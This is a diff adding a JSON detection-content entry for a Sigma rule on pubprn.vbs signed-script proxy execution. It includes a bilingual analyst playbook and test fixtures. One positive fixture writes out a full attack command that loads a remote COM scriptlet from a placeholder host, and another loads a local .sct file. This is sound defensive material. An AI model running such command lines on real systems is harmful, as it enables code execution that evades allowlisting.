@@ -1,0 +1,130 @@
+{
+  "rule": {
+    "id": "1fb76ab8-fa60-4b01-bddd-71e89bf555da",
+    "title": "Pubprn.vbs Proxy Execution",
+    "level": "medium",
+    "status": "test",
+    "author": "frack113",
+    "path": "windows/process_creation/proc_creation_win_lolbin_pubprn.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_lolbin_pubprn.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1216.001"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Se ejecutó el script firmado por Microsoft pubprn.vbs con un argumento 'script:', lo que indica que probablemente se usa para cargar y ejecutar un scriptlet COM (.sct) local o remoto.",
+      "what_it_detects": "Eventos de creación de procesos donde CommandLine contiene '\\pubprn.vbs' y 'script:'. El uso legítimo de pubprn.vbs publica impresoras en Active Directory con una ruta LDAP; el prefijo 'script:' en el segundo argumento hace que GetObject cargue un scriptlet arbitrario.",
+      "why_it_matters": "Corresponde a ATT&CK T1216.001 (Signed Script Proxy Execution: PubPrn). El atacante ejecuta código mediante cscript/wscript y un script firmado de Microsoft, evade controles basados en firmas o listas de permitidos y puede descargar payloads desde una URL.",
+      "triage_steps": [
+        "Revise CommandLine completo: identifique la ruta o URL después de 'script:' y si apunta a un dominio externo, recurso compartido SMB o archivo .sct local.",
+        "Verifique Image (cscript.exe o wscript.exe) y ParentImage; un padre como Office, navegador, mshta o cmd lanzado por un documento es muy sospechoso.",
+        "Identifique el usuario y el host; confirme si el usuario es administrador de impresión o de AD con un motivo real para usar pubprn.vbs.",
+        "Busque conexiones de red y consultas DNS desde el mismo proceso hacia el destino del scriptlet en +/- 15 minutos.",
+        "Revise los procesos hijos de cscript/wscript y la actividad en el host en +/- 15 minutos: PowerShell, rundll32, archivos nuevos, tareas programadas o claves Run.",
+        "Si el .sct es local o accesible, obtenga el archivo, calcule su hash y analice su contenido en un entorno aislado.",
+        "Busque alertas previas del mismo host, usuario o URL/dominio y ejecuciones similares en otros endpoints."
+      ],
+      "false_positives": [
+        "La regla no documenta falsos positivos conocidos; el uso legítimo de pubprn.vbs no requiere el prefijo 'script:'.",
+        "Ejercicios autorizados de red team o pruebas de detección (por ejemplo, Atomic Red Team) que reproducen esta técnica."
+      ],
+      "response_steps": [
+        "Confirme con el usuario o el equipo de red team si la ejecución estaba autorizada antes de actuar.",
+        "Si no está autorizada, aísle el endpoint y bloquee en proxy/DNS el dominio o IP que aloja el scriptlet.",
+        "Elimine el payload y la persistencia identificados tras verificarlos; restablezca las credenciales del usuario si hay indicios de robo.",
+        "Busque el hash, la URL y el patrón de línea de comandos en todo el entorno y considere restringir cscript/wscript mediante AppLocker o WDAC."
+      ],
+      "severity_rationale": "Medium es adecuado: el patrón casi nunca es legítimo, pero por sí solo no confirma ejecución exitosa del payload y requiere validar destino y contexto."
+    },
+    "en": {
+      "summary": "The Microsoft-signed pubprn.vbs script ran with a 'script:' argument, which likely means it was abused to load and execute a local or remote COM scriptlet (.sct).",
+      "what_it_detects": "Process creation events where CommandLine contains both '\\pubprn.vbs' and 'script:'. Legitimate pubprn.vbs use publishes printers to Active Directory with an LDAP path; a 'script:' moniker makes GetObject load an arbitrary scriptlet.",
+      "why_it_matters": "This is ATT&CK T1216.001 (Signed Script Proxy Execution: PubPrn). Attackers run code through cscript/wscript and a signed Microsoft script, bypassing allowlisting or signature-based controls and possibly pulling payloads from a URL.",
+      "triage_steps": [
+        "Read the full CommandLine: extract the path or URL after 'script:' and note whether it is an external domain, SMB share or local .sct file.",
+        "Check Image (cscript.exe or wscript.exe) and ParentImage; Office, browsers, mshta or document-spawned cmd as parent is highly suspicious.",
+        "Identify the user and host; confirm whether the user is a print or AD admin with a real reason to run pubprn.vbs.",
+        "Look for network connections and DNS queries from the process to the scriptlet location within +/- 15 minutes.",
+        "Review child processes and host activity within +/- 15 minutes: PowerShell, rundll32, new files, scheduled tasks or Run keys.",
+        "If the .sct is local or reachable, collect it, hash it and analyze its content in a sandbox.",
+        "Search earlier alerts for the same host, user or URL/domain, and similar executions on other endpoints."
+      ],
+      "false_positives": [
+        "The rule lists no known false positives; legitimate pubprn.vbs usage does not need a 'script:' moniker.",
+        "Authorized red team exercises or detection tests (for example Atomic Red Team) reproducing this technique."
+      ],
+      "response_steps": [
+        "Confirm with the user or red team whether the execution was authorized before acting.",
+        "If unauthorized, isolate the endpoint and block the scriptlet's domain or IP at proxy/DNS.",
+        "After verification, remove identified payloads and persistence; reset the user's credentials if theft is suspected.",
+        "Hunt for the hash, URL and command-line pattern fleet-wide; consider restricting cscript/wscript with AppLocker or WDAC."
+      ],
+      "severity_rationale": "Medium fits: the pattern is rarely legitimate, but alone it does not prove the payload ran successfully and needs destination and context validation."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "cscript runs pubprn.vbs with a remote scriptlet via the script: moniker, launched from cmd",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\cscript.exe",
+          "OriginalFileName": "cscript.exe",
+          "CommandLine": "cscript.exe /b C:\\Windows\\System32\\Printing_Admin_Scripts\\en-US\\pubprn.vbs 127.0.0.1 script:https://files.example.com/update/printer.sct",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "ParentCommandLine": "cmd.exe /c start /min run.bat",
+          "CurrentDirectory": "C:\\Users\\jperez\\AppData\\Local\\Temp\\"
+        }
+      },
+      {
+        "description": "wscript runs pubprn.vbs (mixed case) loading a local .sct file",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0217.andes.example.com",
+          "User": "ANDES\\mrodriguez",
+          "Image": "C:\\Windows\\System32\\wscript.exe",
+          "CommandLine": "wscript.exe C:\\Windows\\System32\\Printing_Admin_Scripts\\es-ES\\PubPrn.vbs localhost \"SCRIPT:C:\\Users\\Public\\p.sct\"",
+          "ParentImage": "C:\\Windows\\explorer.exe",
+          "CurrentDirectory": "C:\\Users\\mrodriguez\\"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Legitimate print admin publishing printers from a print server to an AD OU with an LDAP path",
+        "event": {
+          "EventID": 1,
+          "Computer": "PRINTSRV-01.andes.example.com",
+          "User": "ANDES\\adm.lgomez",
+          "Image": "C:\\Windows\\System32\\cscript.exe",
+          "CommandLine": "cscript.exe C:\\Windows\\System32\\Printing_Admin_Scripts\\en-US\\pubprn.vbs \\\\PRINTSRV-01 \"LDAP://OU=Printers,DC=andes,DC=example,DC=com\"",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "CurrentDirectory": "C:\\Windows\\System32\\"
+        }
+      },
+      {
+        "description": "Another printing admin script (prnmngr.vbs) with no pubprn.vbs and no script: moniker",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\adm.lgomez",
+          "Image": "C:\\Windows\\System32\\cscript.exe",
+          "CommandLine": "cscript.exe C:\\Windows\\System32\\Printing_Admin_Scripts\\en-US\\prnmngr.vbs -l",
+          "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "CurrentDirectory": "C:\\Windows\\System32\\"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
